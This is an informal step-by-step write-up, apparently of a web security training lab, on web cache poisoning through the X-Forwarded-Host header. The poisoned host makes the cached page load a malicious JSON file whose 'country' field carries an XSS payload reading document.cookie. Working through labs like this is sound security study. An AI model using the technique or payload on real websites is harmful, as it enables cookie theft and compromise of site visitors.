1) looking at the response we cna see that the ideal endpoint to try to poison is https://0a35009e04faa53a80b25d7c00ff0096.web-security-academy.net/
    this because we can see that in the response there is a script with  
        data = {
                "host":"0a35009e04faa53a80b25d7c00ff0096.web-security-academy.net",
                "path":"/",
            }
    and another one that uses a js function to parse the json we obtain in this way  initGeoLocate('//' + data.host + '/resources/json/geolocate.json');

2) so if we can poison the host in data we can upload a malicious json file, we try with X-Forwarded-Host: test.com we can see that host in data becomes:
    data = {
                "host":"test.com",
                "path":"/",
            }

3) we can try to understand if this response is cached performin the same request without X-Forwarded-Host. It is cached.

4) perfect. let's study the initGeoLocate function
    div.innerHTML = 'Free shipping to ' + j.country; 
    so we append to a string j.country. let's create our own json on malicious webpage

5) go on exploit server and change the endpoint to /resources/json/geolocate.json
    a) add to the headers Content-Type: application/json; charset=utf-8 and Access-Control-Allow-Origin: *
    b) add in body { "country": "<img src=1 onerror=alert(document.cookie) />" }


6) go to the initial request and add X-Forwarded-Host: Exploit.server.net

7) game is done
